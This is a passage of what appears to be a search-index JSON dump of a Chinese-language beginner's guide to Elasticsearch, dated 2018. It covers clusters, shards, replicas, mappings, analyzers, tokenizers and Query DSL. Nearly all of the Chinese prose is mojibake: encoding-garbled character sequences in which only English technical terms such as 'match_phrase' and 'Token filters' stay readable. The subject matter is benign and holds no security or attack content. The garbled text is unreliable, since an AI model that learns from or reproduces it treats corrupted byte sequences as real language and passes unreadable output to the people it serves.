å†æ¥ç†è§£å…¨æ–‡æœç´¢æ˜¯ä»€ä¹ˆï¼Ÿä¸¾ä¾‹æ¥è¯´ï¼Œå°±æ˜¯å°†ä¸Šé¢é‚£æ®µè¯æŒ‰ç…§è¯­ä¹‰æ‹†åˆ†æˆä¸åŒçš„è¯ç»„å¹¶è®°å½•å…¶å‡ºç°çš„é¢‘ç‡ï¼ˆä¸“ä¸šæœ¯è¯­å«æ„å»ºå€’æ’ç´¢å¼•ï¼‰ï¼Œè¿™æ ·å½“ä½ è¾“å…¥ä¸€ä¸ªç®€å•çš„å…³é”®è¯å°±èƒ½å°†å…¶æœç´¢å‡ºæ¥ã€‚ æ€»è€Œè¨€ä¹‹ï¼ŒElasticsearch å°±æ˜¯ä¸ºæœç´¢è€Œç”Ÿã€‚ ","date":"2018-07-29","objectID":"/es-guide/:0:1","tags":["Elasticsearch"],"title":"Elasticsearch å…¥é—¨æŒ‡å—","uri":"/es-guide/"},{"categories":["Elasticsearch"],"content":"ä¸€ã€åŸºæœ¬æ¦‚å¿µ Near Realtimeï¼ˆè¿‘å®æ—¶ï¼‰ Elasticsearch æ˜¯ä¸€ä¸ªè¿‘å®æ—¶çš„æœç´¢å¹³å°ã€‚ä¸ºä»€ä¹ˆæ˜¯è¿‘å®æ—¶ï¼Ÿåœ¨ä¼ ç»Ÿçš„æ•°æ®åº“ä¸­ä¸€æ—¦æˆ‘ä»¬æ’å…¥äº†æŸæ¡æ•°æ®ï¼Œåˆ™ç«‹åˆ»å¯ä»¥æœç´¢åˆ°å®ƒï¼Œè¿™å°±æ˜¯å®æ—¶ã€‚åä¹‹åœ¨ Elasticsearch ä¸­ä¸ºæŸæ¡æ•°æ®æ„å»ºäº†ç´¢å¼•ï¼ˆæ’å…¥æ•°æ®çš„æ„æ€ï¼‰ä¹‹åï¼Œå¹¶ä¸èƒ½ç«‹åˆ»å°±æœç´¢åˆ°ï¼Œå› ä¸ºå®ƒåœ¨åº•å±‚éœ€è¦è¿›è¡Œæ„å»ºå€’æ’ç´¢å¼•ã€å°†æ•°æ®åŒæ­¥åˆ°å‰¯æœ¬ç­‰ç­‰ä¸€ç³»åˆ—æ“ä½œï¼Œæ‰€ä»¥æ˜¯è¿‘å®æ—¶ï¼ˆé€šå¸¸ä¸€ç§’ä»¥å†…ï¼Œæ— éœ€è¿‡äºæ‹…å¿ƒï¼‰ã€‚ Clusterï¼ˆé›†ç¾¤ï¼‰\u0026 Nodeï¼ˆèŠ‚ç‚¹ï¼‰ æ¯ä¸€ä¸ªå•ä¸€çš„ Elasticsearch æœåŠ¡å™¨ç§°ä¹‹ä¸ºä¸€ä¸ª Node èŠ‚ç‚¹ï¼Œè€Œä¸€ä¸ªæˆ–å¤šä¸ª Node èŠ‚ç‚¹åˆ™ç»„æˆäº† Cluster é›†ç¾¤ã€‚Cluster å’Œ Node ä¸€å®šæ˜¯åŒæ—¶å­˜åœ¨çš„ï¼Œæ¢å¥è¯è¯´æˆ‘ä»¬è‡³å°‘æ‹¥æœ‰ä¸€ä¸ªç”±å•ä¸€èŠ‚ç‚¹æ„æˆçš„é›†ç¾¤ï¼Œè€Œåœ¨å®é™…å¯¹å¤–æä¾›ç´¢å¼•å’Œæœç´¢æœåŠ¡æ—¶ï¼Œæˆ‘ä»¬åº”è¯¥å°† Cluster é›†ç¾¤è§†ä¸ºä¸€ä¸ªåŸºæœ¬å•å…ƒã€‚ Cluster é›†ç¾¤é»˜è®¤çš„åç§°å°±æ˜¯ elasticsearch ï¼Œè€Œ Node èŠ‚ç‚¹é»˜è®¤çš„åç§°æ˜¯ä¸€ä¸ªéšæœºçš„ UUID ï¼Œæˆ‘ä»¬åªè¦å°†ä¸åŒ Node èŠ‚ç‚¹çš„ cluster name è®¾ç½®ä¸ºåŒä¸€ä¸ªåç§°ä¾¿æ„æˆäº†ä¸€ä¸ªé›†ç¾¤ï¼ˆä¸è®ºè¿™äº›èŠ‚ç‚¹æ˜¯å¦åœ¨åŒä¸€å°æœåŠ¡å™¨ä¸Šï¼Œåªè¦ç½‘ç»œæœ‰æ•ˆå¯è¾¾ï¼ŒElasticsearch æœ¬èº«ä¼šè‡ªå·±å»æœç´¢å¹¶å‘ç°è¿™äº›èŠ‚ç‚¹å¹¶æ„æˆé›†ç¾¤ï¼‰ã€‚ Indexï¼ˆç´¢å¼•ï¼‰\u0026 Typeï¼ˆç±»å‹ï¼‰\u0026 Documentï¼ˆæ–‡æ¡£ï¼‰ Documentï¼ˆæ–‡æ¡£ï¼‰æ˜¯æœ€åŸºæœ¬çš„æ•°æ®å•å…ƒï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶ç†è§£ä¸º mysql ä¸­çš„å…·ä½“çš„æŸä¸€è¡Œæ•°æ®ã€‚ Typeï¼ˆç±»å‹ï¼‰åœ¨ 6.0 ç‰ˆæœ¬ä¹‹åè¢«ç§»é™¤ï¼Œå®ƒæ˜¯ä¸€ä¸ªé€»è¾‘åˆ†ç±»ï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶ç†è§£ä¸º mysql ä¸­çš„æŸä¸€å¼ è¡¨ã€‚ Indexï¼ˆç´¢å¼•ï¼‰æ˜¯å…·æœ‰ç±»ä¼¼ç‰¹å¾çš„ Document æ–‡æ¡£çš„é›†åˆï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶ç†è§£ä¸º mysql ä¸­çš„æŸä¸€ä¸ªæ•°æ®åº“ã€‚ Shardsï¼ˆåˆ†ç‰‡ï¼‰\u0026 Replicasï¼ˆå‰¯æœ¬ï¼‰ ä¸ºäº†æ›´æœ‰æ•ˆçš„å­˜å‚¨åºå¤§ä½“é‡çš„æ•°æ®ï¼ŒElasticsearch æœ‰äº† shard åˆ†ç‰‡çš„å­˜åœ¨ï¼Œåœ¨å¯¹æ•°æ®è¿›è¡Œå­˜å‚¨ä¾¿ä¼šå°†å…¶åˆ†æ•£åˆ°ä¸åŒçš„ shard åˆ†ç‰‡ä¸­ï¼Œè¿™å°±å¦‚åŒåœ¨ä½¿ç”¨ mysql æ—¶ï¼Œå¦‚æœä¸€å¼ è¡¨çš„æ•°æ®é‡è¿‡äºåºå¤§æ—¶ï¼Œæˆ‘ä»¬å°†å…¶æ°´å¹³æ‹†åˆ†ä¸ºå¤šå¼ è¡¨ä¸€æ ·çš„é“ç†ã€‚ç„¶è€Œ shard çš„åˆ†å¸ƒæ–¹å¼ä»¥åŠå¦‚ä½•å°†ä¸åŒåˆ†ç‰‡çš„æ–‡æ¡£èšåˆå›æœç´¢è¯·æ±‚éƒ½æ˜¯ç”± Elasticsearch æœ¬èº«æ¥å®Œæˆï¼Œè¿™äº›å¯¹ç”¨æˆ·è€Œè¨€æ˜¯æ— æ„Ÿçš„ã€‚åŒæ—¶åˆ†ç‰‡çš„æ•°é‡ä¸€æ—¦è®¾ç½®åˆ™åœ¨ç´¢å¼•åˆ›å»ºåä¾¿æ— æ³•ä¿®æ”¹ï¼Œé»˜è®¤ä¸ºäº”ä¸ªåˆ†ç‰‡ã€‚ å¯¹äºå‰¯æœ¬ï¼Œåˆ™æ˜¯ä¸ºäº†é˜²æ­¢æ•°æ®ä¸¢å¤±ã€å®ç°é«˜å¯ç”¨ï¼ŒåŒæ—¶å‰¯æœ¬ä¹Ÿæ˜¯å¯ä»¥è¿›è¡ŒæŸ¥è¯¢çš„ï¼Œæ‰€ä»¥ä¹Ÿæœ‰åŠ©äºæé«˜ååé‡ã€‚å‰¯æœ¬ä¸åˆ†ç‰‡ä¸€ä¸€å¯¹åº”ï¼Œå‰¯æœ¬çš„æ•°é‡å¯ä»¥éšæ—¶è°ƒæ•´ï¼Œé»˜è®¤è®¾ç½®ä¸ºæ¯ä¸€ä¸ªä¸»åˆ†ç‰‡æœ‰ä¸€ä¸ªå‰¯æœ¬åˆ†ç‰‡ã€‚å‰¯æœ¬åˆ†ç‰‡å’Œä¸»åˆ†ç‰‡ä¸€å®šä¸ä¼šè¢«åˆ†é…åœ¨åŒä¸€ä¸ªèŠ‚ç‚¹ä¸­ï¼Œæ‰€ä»¥å¯¹äºå•èŠ‚ç‚¹é›†ç¾¤è€Œè¨€ï¼Œå‰¯æœ¬åˆ†ç‰‡æ˜¯æ— æ•ˆçš„ã€‚ ","date":"2018-07-29","objectID":"/es-guide/:1:0","tags":["Elasticsearch"],"title":"Elasticsearch å…¥é—¨æŒ‡å—","uri":"/es-guide/"},{"categories":["Elasticsearch"],"content":"äºŒã€Mapping Mapping ï¼ˆæ˜ å°„ï¼‰åœ¨ ES ä¸­çš„ä½œç”¨è‡³å…³é‡è¦ï¼Œæ•°æ®ç»“æ„ã€å­˜å‚¨å’Œç´¢å¼•è§„åˆ™ç­‰ç­‰éƒ½æ˜¯é€šè¿‡ mapping æ¥è¿›è¡Œè®¾ç½®çš„ã€‚ ","date":"2018-07-29","objectID":"/es-guide/:2:0","tags":["Elasticsearch"],"title":"Elasticsearch å…¥é—¨æŒ‡å—","uri":"/es-guide/"},{"categories":["Elasticsearch"],"content":"Dynamic Mappingï¼ˆåŠ¨æ€æ˜ å°„) åœ¨ä½¿ç”¨ä¼ ç»Ÿå…³ç³»å‹æ•°æ®åº“å¦‚ mysql æ—¶ï¼Œå¦‚æœä¸äº‹å…ˆæ˜ç¡®å®šä¹‰æ•°æ®ç»“æ„æ˜¯æ— æ³•è¿›è¡Œæ•°æ®æ“ä½œçš„ï¼Œä½†æ˜¯åœ¨ ES ä¸­ä¸éœ€è¦è¿™æ ·ï¼Œå› ä¸º ES æœ¬èº«ä¼šè‡ªå·±å»æ£€æµ‹æ•°æ®å¹¶ç»™å‡ºå…¶æ•°æ®ç±»å‹ç„¶åè¿›è¡Œç´¢å¼•æˆ–å­˜å‚¨ã€‚æ‰€ä»¥ç§°ä¹‹ä¸ºåŠ¨æ€æ˜ å°„ã€‚ æ•°æ®ç±»å‹çš„åˆ¤æ–­åŠå®šä¹‰è§„åˆ™å¦‚ä¸‹ï¼š ç„¶è€Œï¼Œä»…ä»…ä¾èµ–äº ES è‡ªèº«å»åˆ¤æ–­å¹¶å®šä¹‰æ•°æ®ç±»å‹æ˜¾ç„¶æ˜¯æ¯”è¾ƒå—é™çš„ï¼Œæˆ‘ä»¬ä»ç„¶éœ€è¦å¯¹æ•°æ®ç±»å‹è¿›è¡Œå¯†åˆ‡å…³æ³¨ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè™½ç„¶ mapping æ˜ å°„æ˜¯åŠ¨æ€çš„ï¼Œä½†è¿™å¹¶ä¸æ„å‘³ç€æˆ‘ä»¬å¯ä»¥éšæ„çš„ä¿®æ”¹å®ƒï¼Œå¯¹äºå·²ç»å­˜åœ¨çš„ field mappingï¼ˆå­—æ®µæ˜ å°„ï¼‰æ˜¯æ— æ³•ç›´æ¥ä¿®æ”¹çš„ï¼Œåªèƒ½é‡æ–°ç´¢å¼•ï¼ˆreindexï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å¯¹ mapping æœ‰ä¸€ä¸ªæ·±å…¥çš„äº†è§£ã€‚ ","date":"2018-07-29","objectID":"/es-guide/:2:1","tags":["Elasticsearch"],"title":"Elasticsearch å…¥é—¨æŒ‡å—","uri":"/es-guide/"},{"categories":["Elasticsearch"],"content":"Field datatypesï¼ˆå­—æ®µæ•°æ®ç±»å‹ï¼‰ ES ä¸­çš„ filedï¼ˆå­—æ®µï¼‰å¦‚åŒ mysql è¡¨ä¸­çš„åˆ—ä¸€æ ·ï¼Œå…¶æ•°æ®ç±»å‹ä¹Ÿæœ‰å¾ˆå¤šç§ï¼š ","date":"2018-07-29","objectID":"/es-guide/:2:2","tags":["Elasticsearch"],"title":"Elasticsearch å…¥é—¨æŒ‡å—","uri":"/es-guide/"},{"categories":["Elasticsearch"],"content":"Meta-fieldsï¼ˆå…ƒå­—æ®µï¼‰ æ¯ä¸€ä¸ª document éƒ½æœ‰ä¸€äº›ä¸ä¹‹å…³è”çš„å…ƒæ•°æ®ï¼š ","date":"2018-07-29","objectID":"/es-guide/:2:3","tags":["Elasticsearch"],"title":"Elasticsearch å…¥é—¨æŒ‡å—","uri":"/es-guide/"},{"categories":["Elasticsearch"],"content":"Mapping parametersï¼ˆæ˜ å°„å‚æ•°ï¼‰ è®¾ç½® mapping æ—¶çš„å„ç§å‚æ•°åŠå…¶å«ä¹‰ï¼š ","date":"2018-07-29","objectID":"/es-guide/:2:4","tags":["Elasticsearch"],"title":"Elasticsearch å…¥é—¨æŒ‡å—","uri":"/es-guide/"},{"categories":["Elasticsearch"],"content":"Dynamic templatesï¼ˆåŠ¨æ€æ¨¡æ¿ï¼‰ åº”ç”¨äºåŠ¨æ€æ·»åŠ å­—æ®µæ—¶è®¾ç½®è‡ªå®šä¹‰ mapping æ˜ å°„ï¼Œé€šè¿‡åœ¨æ¨¡æ¿ä¸­è®¾ç½®åŒ¹é…åŠæ˜ å°„çš„è§„åˆ™ï¼ŒåŒ¹é…å‘½ä¸­åˆ™ä¼šè¢«è®¾ç½®ä¸ºå¯¹åº”çš„ mapping ï¼ŒåŒ¹é…å‚æ•°è®¾ç½®å¦‚ä¸‹ï¼š Mapping çš„è®¾ç½®å…¶å®æ˜¯ä¸€ä¸ªä¸æ–­å¾ªç¯æ”¹è¿›çš„è¿‡ç¨‹ï¼ŒåŒæ—¶å…¶ä¸å…·ä½“ä¸šåŠ¡åˆæœ‰ç€å¯†åˆ‡çš„è”ç³»ã€‚ç†è§£äº† Mapping æ›´æœ‰åŠ©äºç†è§£æ•°æ®åœ¨ ES ä¸­çš„æœç´¢è¡Œä¸ºè¡¨ç°ã€‚ åœ¨ ES ä¸­ï¼Œå…¨æ–‡æœç´¢ä¸ Analysis éƒ¨åˆ†å¯†ä¸å¯åˆ†ã€‚æˆ‘ä»¬ä¸ºä»€ä¹ˆèƒ½å¤Ÿé€šè¿‡ä¸€ä¸ªç®€å•çš„è¯æ¡å°±æœç´¢åˆ°æ•´ä¸ªæ–‡æœ¬ï¼Ÿå› ä¸º Analyzer åˆ†æå™¨çš„å­˜åœ¨ï¼Œå…¶ä½œç”¨ç®€è€Œè¨€ä¹‹å°±æ˜¯æŠŠæ•´ä¸ªæ–‡æœ¬æŒ‰ç…§æŸä¸ªè§„åˆ™æ‹†åˆ†æˆä¸€ä¸ªä¸€ä¸ªç‹¬ç«‹çš„å­—æˆ–è¯ï¼Œç„¶ååŸºäºæ­¤å»ºç«‹å€’æ’ç´¢å¼•ã€‚ ","date":"2018-07-29","objectID":"/es-guide/:2:5","tags":["Elasticsearch"],"title":"Elasticsearch å…¥é—¨æŒ‡å—","uri":"/es-guide/"},{"categories":["Elasticsearch"],"content":"ä¸‰ã€Analyzer Analyzerï¼ˆåˆ†æå™¨ï¼‰çš„ä½œç”¨å‰æ–‡å·²ç»è¯´è¿‡äº†ï¼šæ‹†åˆ†æ–‡æœ¬ã€‚ æ¯ä¸€ä¸ª Analyzer éƒ½ç”±ä¸‰ä¸ªåŸºç¡€ç­‰çº§çš„æ„å»ºå—ç»„æˆï¼š Character filters Tokenizer Token filters 1ã€Character filters ï¼šæ¥å—åŸå§‹è¾“å…¥æ–‡æœ¬ï¼Œå°†å…¶è½¬æ¢ä¸ºå­—ç¬¦æµå¹¶æŒ‰ç…§æŒ‡å®šè§„åˆ™åŸºäºå­—ç¬¦è¿›è¡Œå¢åˆ æ”¹æ“ä½œï¼Œæœ€åè¾“å‡ºå­—ç¬¦æµã€‚ 2ã€Tokenizer ï¼šæ¥å—å­—ç¬¦æµä½œä¸ºè¾“å…¥ï¼Œå°†å…¶æŒ‰ç…§æŒ‡å®šè§„åˆ™æ‹†åˆ†ä¸ºå•ç‹¬çš„ tokensï¼ˆ è¿™é‡Œçš„ token å°±æ˜¯æˆ‘ä»¬é€šå¸¸ç†è§£çš„å­—æˆ–è€…è¯ ï¼‰ï¼Œæœ€åè¾“å‡º tokens æµã€‚ 3ã€Token filters ï¼šæ¥å— tokens æµä½œä¸ºè¾“å…¥ï¼ŒæŒ‰ç…§æŒ‡å®šè§„åˆ™åŸºäº token è¿›è¡Œå¢åˆ æ”¹æ“ä½œï¼Œæœ€åçš„è¾“å‡ºä¹Ÿæ˜¯ tokens æµã€‚ ä¸€ä¸ªå®Œæ•´çš„åŒ…å«ä»¥ä¸Šä¸‰ä¸ªéƒ¨åˆ†çš„åˆ†ææµç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š æ³¨æ„ï¼šå¹¶ä¸æ˜¯æ¯ä¸€ä¸ª Analyzer åˆ†æå™¨éƒ½éœ€è¦åŒæ—¶å…·å¤‡ä»¥ä¸Šä¸‰ç§åŸºç¡€æ„å»ºå—ã€‚ ä¸€ä¸ª Analyzer åˆ†æå™¨çš„ç»„æˆæœ‰ï¼š é›¶ä¸ªæˆ–å¤šä¸ª Character filters å¿…é¡»ä¸”åªèƒ½æœ‰ä¸€ä¸ª Tokenizer é›¶ä¸ªæˆ–å¤šä¸ª Token filters ","date":"2018-07-29","objectID":"/es-guide/:3:0","tags":["Elasticsearch"],"title":"Elasticsearch å…¥é—¨æŒ‡å—","uri":"/es-guide/"},{"categories":["Elasticsearch"],"content":"Character filter Character filter çš„ä½œç”¨å°±æ˜¯å¯¹å­—ç¬¦è¿›è¡Œå¤„ç†ï¼Œæ¯”å¦‚ç§»é™¤ HTML ä¸­çš„å…ƒç´ å¦‚ ï¼ŒæŒ‡å®šæŸä¸ªå…·ä½“çš„å­—ç¬¦è¿›è¡Œæ›¿æ¢ abc =\u003e 123 ï¼Œæˆ–è€…ä½¿ç”¨æ­£åˆ™çš„æ–¹å¼æ›¿æ¢æ‰åŒ¹é…çš„éƒ¨åˆ†ã€‚ ES å†…ç½®äº†ä»¥ä¸‹ä¸‰ç§ Character filters ï¼š ","date":"2018-07-29","objectID":"/es-guide/:3:1","tags":["Elasticsearch"],"title":"Elasticsearch å…¥é—¨æŒ‡å—","uri":"/es-guide/"},{"categories":["Elasticsearch"],"content":"Tokenizer Tokenizer çš„ä½œç”¨å°±æ˜¯æŒ‰ç…§æŸä¸ªè§„åˆ™å°†æ–‡æœ¬å­—ç¬¦æµæ‹†åˆ†æˆç‹¬ç«‹çš„ tokenï¼ˆå­—è¯ï¼‰ã€‚ wordã€letterã€character çš„åŒºåˆ«ï¼š wordï¼šæˆ‘ä»¬é€šå¸¸ç†è§£çš„å­—æˆ–è€…è¯ã€‚ letterï¼šæŒ‡è‹±è¯­é‡Œçš„é‚£ 26 ä¸ªå­—æ¯ã€‚ characterï¼šæŒ‡ letter åŠ ä¸Šå…¶å®ƒå„ç§æ ‡ç‚¹ç¬¦å·ã€‚ token å’Œ term çš„åŒºåˆ«ï¼ˆå‚è€ƒLuceneï¼‰ï¼š tokenï¼šåœ¨æ–‡æœ¬åˆ†è¯çš„è¿‡ç¨‹ä¸­äº§ç”Ÿçš„å¯¹è±¡ï¼Œå…¶ä¸ä»…åŒ…å«äº†åˆ†è¯å¯¹è±¡çš„è¯è¯­å†…å®¹ï¼Œè¿˜åŒ…å«äº†å…¶åœ¨æ–‡æœ¬ä¸­çš„å¼€å§‹å’Œç»“æŸä½ç½®ï¼Œä»¥åŠè¿™ä¸ªè¯è¯­çš„ç±»å‹ï¼ˆæ˜¯å…³é”®è¯è¿˜æ˜¯åœç”¨è¯ä¹‹ç±»çš„ï¼‰ã€‚ termï¼šæŒ‡æ–‡æœ¬ä¸­çš„æŸä¸€ä¸ªè¯è¯­å†…å®¹ï¼Œä»¥åŠå…¶æ‰€åœ¨çš„ field åŸŸã€‚ ç„¶è€Œï¼Œåœ¨æŸäº›è¯­å¢ƒä¸‹ï¼Œå…¶å® token å’Œ term æ›´å…³æ³¨çš„ä»…ä»…åªæ˜¯è¯è¯­å†…å®¹æœ¬èº«ã€‚ ES å†…ç½®äº†åäº”ç§ Tokenizer ï¼Œå¹¶åˆ’åˆ†ä¸ºä¸‰ç±»ï¼š 1ã€é¢å‘å­—è¯ï¼š 2ã€ä»¥å­—è¯çš„æŸéƒ¨åˆ†ä¸ºç²’åº¦ï¼š 3ã€ç»“æ„åŒ–æ–‡æœ¬ï¼š ","date":"2018-07-29","objectID":"/es-guide/:3:2","tags":["Elasticsearch"],"title":"Elasticsearch å…¥é—¨æŒ‡å—","uri":"/es-guide/"},{"categories":["Elasticsearch"],"content":"Token Filter Token Filter çš„ä½œç”¨å°±æ˜¯æŠŠ Tokenizer å¤„ç†å®Œç”Ÿæˆçš„ token æµè¿›è¡Œå¢åˆ æ”¹å†å¤„ç†ã€‚ ES å†…ç½®çš„ token filter æ•°é‡å¤šè¾¾å››äº”åç§ï¼š ä¸Šå›¾åªæ˜¯ç®€å•ç½—åˆ—è¯´æ˜ï¼Œæ­¤å¤„ä¸è¿›è¡Œå±•å¼€è¯´æ˜ï¼Œæ›´å¤šç»†èŠ‚è¿˜æ˜¯æŸ¥é˜…å®˜æ–¹æ–‡æ¡£å¥½äº†ã€‚ ","date":"2018-07-29","objectID":"/es-guide/:3:3","tags":["Elasticsearch"],"title":"Elasticsearch å…¥é—¨æŒ‡å—","uri":"/es-guide/"},{"categories":["Elasticsearch"],"content":"Analyzer ES å†…ç½®äº†ä»¥ä¸‹ Analyzer ï¼š å¯ä»¥çœ‹åˆ°æ¯ä¸€ä¸ª Analyzer éƒ½ç´§ç´§å›´ç»• Character filters ã€Tokenizerã€Token filters ä¸‰ä¸ªéƒ¨åˆ†ã€‚ åŒæ ·ï¼Œåªè¦é€‰æ‹©å¹¶ç»„åˆè‡ªå·±éœ€è¦çš„ä»¥ä¸Šè¿™ä¸‰ä¸ªåŸºæœ¬éƒ¨åˆ†å°±å¯ä»¥ç®€å•çš„è¿›è¡Œè‡ªå®šä¹‰ Analyzer åˆ†æå™¨äº†ã€‚ æœ¬èŠ‚ç®€å•ä»‹ç»äº†ä¸å…¨æ–‡æœç´¢å¯†åˆ‡ç›¸å…³çš„ã€åˆ†æã€‘è¿™ä¸€é‡è¦éƒ¨åˆ†ï¼Œè€Œå¦‚ä½•è¿›è¡Œå®é™…çš„åˆ†æå™¨è®¾ç½®åˆ™ä¸ Mapping ç›¸å…³è”ï¼Œå¦å¤–é™¤äº† ES å†…ç½®çš„ä¹‹å¤–ï¼Œè¿˜æœ‰å¾ˆå¤šå¼€æºçš„åˆ†æå™¨åŒæ ·å€¼å¾—ä½¿ç”¨ï¼Œæ¯”å¦‚ä¸­æ–‡åˆ†è¯ï¼Œä½¿ç”¨è¾ƒå¤šçš„å°±æ˜¯ IK åˆ†è¯ã€‚ ","date":"2018-07-29","objectID":"/es-guide/:3:4","tags":["Elasticsearch"],"title":"Elasticsearch å…¥é—¨æŒ‡å—","uri":"/es-guide/"},{"categories":["Elasticsearch"],"content":"å››ã€Query DSL å¯¹äº ESï¼Œå½“æˆ‘ä»¬äº†è§£äº† mapping å’Œ analysis çš„ç›¸å…³å†…å®¹ä¹‹åï¼Œä½¿ç”¨è€…æ›´å…³å¿ƒçš„é—®é¢˜å¾€å¾€æ˜¯å¦‚ä½•æ„å»ºæŸ¥è¯¢è¯­å¥ä»è€Œæœç´¢åˆ°è‡ªå·±æƒ³è¦çš„æ•°æ®ã€‚å› æ­¤ï¼Œæœ¬èŠ‚å°†ä¼šä»‹ç» Query DSL çš„ç›¸å…³å†…å®¹ã€‚ Query DSL æ˜¯ä»€ä¹ˆï¼Ÿ Query Domain Specific Language ï¼Œç‰¹å®šé¢†åŸŸæŸ¥è¯¢è¯­è¨€ã€‚é¦–å…ˆå®ƒçš„ä½œç”¨æ˜¯æŸ¥è¯¢ï¼Œå…¶æ¬¡å…¶è¯­æ³•æ ¼å¼åªèƒ½ä½œç”¨äº ES ä¸­ï¼Œæ‰€ä»¥å°±æˆäº†æ‰€è°“çš„ç‰¹å®šé¢†åŸŸã€‚ Query DSL å¯åˆ†ä¸ºä¸¤ç§ç±»å‹ï¼š Leaf query clauses ç®€å•æŸ¥è¯¢å­å¥ï¼ŒæŸ¥è¯¢ç‰¹å®š field å­—æ®µä¸­çš„ç‰¹å®šå€¼ã€‚ Compound query clauses å¤åˆæŸ¥è¯¢å­å¥ï¼Œç”±å¤šä¸ªç®€å•æŸ¥è¯¢å­å¥æˆ–å¤åˆæŸ¥è¯¢å­å¥ä»¥é€»è¾‘æ–¹å¼ç»„åˆè€Œæˆã€‚ ","date":"2018-07-29","objectID":"/es-guide/:4:0","tags":["Elasticsearch"],"title":"Elasticsearch å…¥é—¨æŒ‡å—","uri":"/es-guide/"},{"categories":["Elasticsearch"],"content":"Query and filter context æŸ¥è¯¢è¯­å¥çš„è¡Œä¸ºä¾èµ–äºå…¶ä¸Šä¸‹æ–‡ç¯å¢ƒæ˜¯ query context è¿˜æ˜¯ filter context ã€‚ Filter context : æŸä¸ª document æ–‡æ¡£æ˜¯å¦åŒ¹é…æŸ¥è¯¢è¯­å¥ï¼Œç­”æ¡ˆåªæœ‰æ˜¯å’Œå¦ã€‚å¯¹äº filter æŸ¥è¯¢ ES ä¼šè‡ªåŠ¨è¿›è¡Œç¼“å­˜å¤„ç†ï¼Œå› æ­¤æŸ¥è¯¢æ•ˆç‡éå¸¸é«˜ï¼Œåº”å°½å¯èƒ½å¤šçš„ä½¿ç”¨ã€‚ Query context : é™¤äº†æ–‡æ¡£æ˜¯å¦åŒ¹é…ä¹‹å¤–ï¼Œè¿˜ä¼šè®¡ç®—å…¶åŒ¹é…ç¨‹åº¦ï¼Œä»¥ _score è¡¨ç¤ºã€‚ä¾‹å¦‚æŸä¸ªæ–‡æ¡£è¢« analyzer è§£ææˆäº†åä¸ª termsï¼Œè€ŒæŸ¥è¯¢è¯­å¥åŒ¹é…äº†å…¶ä¸­çš„ä¸ƒä¸ª termsï¼Œé‚£ä¹ˆåŒ¹é…ç¨‹åº¦ _score å°±æ˜¯ 0.7 ã€‚ ","date":"2018-07-29","objectID":"/es-guide/:4:1","tags":["Elasticsearch"],"title":"Elasticsearch å…¥é—¨æŒ‡å—","uri":"/es-guide/"},{"categories":["Elasticsearch"],"content":"Match All Query æœ€ç®€å•çš„æŸ¥è¯¢ã€‚ match_all : åŒ¹é…æ‰€æœ‰æ–‡æ¡£ã€‚ match_none : ä¸åŒ¹é…ä»»ä½•æ–‡æ¡£ã€‚ ","date":"2018-07-29","objectID":"/es-guide/:4:2","tags":["Elasticsearch"],"title":"Elasticsearch å…¥é—¨æŒ‡å—","uri":"/es-guide/"},{"categories":["Elasticsearch"],"content":"Full text queries å…¨æ–‡æŸ¥è¯¢ï¼Œåœ¨æ‰§è¡Œä¹‹å‰ä¼šå…ˆåˆ†æè¿›è¡ŒæŸ¥è¯¢çš„å­—ç¬¦ä¸²ï¼Œè€ŒæŸ¥è¯¢çš„è¡Œä¸ºä¹Ÿä¸ analyzer æ¯æ¯ç›¸å…³ã€‚ ä½äºè¿™ä¸€ç»„å†…çš„æŸ¥è¯¢åŒ…æ‹¬ï¼š match å…¨æ–‡æŸ¥è¯¢ä¸­çš„æ ‡å‡†æŸ¥è¯¢ï¼ŒåŒ…æ‹¬æ¨¡ç³ŠåŒ¹é…å’ŒçŸ­è¯­æˆ–é‚»è¿‘æŸ¥è¯¢ã€‚ match_phrase ç±»ä¼¼äº match ï¼Œä½†ç”¨äºåŒ¹é…ç²¾ç¡®çŸ­è¯­æˆ–å•è¯é‚»è¿‘åŒ¹é…ã€‚ match_phrase_prefix ç±»ä¼¼äº match_phraseï¼Œä½†æ˜¯è¿›è¡Œå•è¯å°¾éƒ¨é€šé…ç¬¦æœç´¢ã€‚ multi_match match çš„ multi-fields å¤šå­—æ®µç‰ˆæœ¬ã€‚ common terms ä¼˜å…ˆè€ƒè™‘ä¸å¸¸è§å•è¯çš„æ›´ä¸“ä¸šçš„æŸ¥è¯¢ã€‚ä¾‹å¦‚è‹±æ–‡ä¸­çš„ the æ˜¯ä¸€ä¸ªå¸¸è§çš„é«˜é¢‘å•è¯ï¼Œè‹¥ç›´æ¥æŸ¥è¯¢ä¼šåŒ¹é…åˆ°å¤§é‡æ–‡æ¡£ä¸”æµªè´¹æ€§èƒ½ï¼Œä½†æ˜¯æŸäº›æ—¶å€™åˆæ— æ³•ç›´æ¥å°†å…¶å¿½ç•¥ï¼Œè¿™æ—¶å€™å°±ç”¨åˆ°äº† common terms query ï¼Œå…¶åŸç†æ˜¯å…ˆåŒ¹é…ä½é¢‘å•è¯ï¼Œç„¶ååœ¨æ­¤åŒ¹é…ç»“æœä¸Šå†å»åŒ¹é… the è¿™ç§é«˜é¢‘å•è¯ã€‚ query_string æ”¯æŒ Lucene æŸ¥è¯¢å­—ç¬¦ä¸²è¯­æ³•ï¼Œå¯¹ Lucene æ¯”è¾ƒç†Ÿæ‚‰çš„å¯ä»¥ç©ç©ï¼Œä½†ä¸€èˆ¬ä¸éœ€è¦ç”¨åˆ°ã€‚ simple_query_string query_string çš„ç®€æ˜“ç‰ˆæœ¬ã€‚ ","date":"2018-07-29","objectID":"/es-guide/:4:3","tags":["Elasticsearch"],"title":"Elasticsearch å…¥é—¨æŒ‡å—","uri":"/es-guide/"},{"categories":["Elasticsearch"],"content":"Term level queries term æ˜¯å€’æ’ç´¢å¼•ä¸­çš„åŸºæœ¬å•å…ƒï¼Œterm-level çº§åˆ«çš„æŸ¥è¯¢ä¹Ÿæ˜¯ç›´æ¥æ“ä½œç²¾ç¡®çš„å­˜å‚¨åœ¨å€’æ’ç´¢å¼•ä¸Šçš„ terms ã€‚é€šå¸¸ç”¨äºç»“æ„åŒ–æ•°æ®æŸ¥è¯¢ï¼Œå¦‚æ•°å­—ã€æ—¥æœŸã€æšä¸¾ï¼Œè€Œä¸æ˜¯å…¨æ–‡å­—æ®µã€‚ æŸ¥è¯¢åŒ…æ‹¬ï¼š term 